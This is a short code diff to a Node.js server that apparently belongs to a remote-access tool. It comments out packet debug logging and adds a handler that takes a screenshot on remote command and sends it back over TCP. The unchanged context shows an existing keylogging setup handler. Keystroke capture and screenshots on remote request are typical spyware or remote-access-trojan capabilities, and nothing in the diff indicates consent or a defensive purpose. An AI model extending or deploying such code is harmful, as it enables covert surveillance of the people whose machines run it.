@@ -88,13 +88,11 @@ class Server {
   }
 
   _onPacket (packet, socket) {
-    // console.debug('>RECV>', packet)
-
-    if (socket._isUDP) {
-      console.debug('>RECV_UDP>', packet)
-    } else {
-      console.debug('>RECV_TCP>', packet)
-    }
+    // if (socket._isUDP) {
+    //   console.debug('>RECV_UDP>', packet)
+    // } else {
+    //   console.debug('>RECV_TCP>', packet)
+    // }
     
     let connectionPair = null
 
@@ -247,4 +245,13 @@ server.on(Packets.KeylogSetup, function(packet, conn) {
   }, packet.data.interval)
   
   conn.tcp.__destructors.keylog = disableKeylog
+})
+
+
+const screenshot = require('./lib/Screenshot');
+server.on(Packets.Screenshot, async function(packet, conn) {
+  let screenshotData = await screenshot.screenshot();
+  conn.tcp.write(Packets.r_Screenshot.create(
+    screenshotData
+  ))
 })
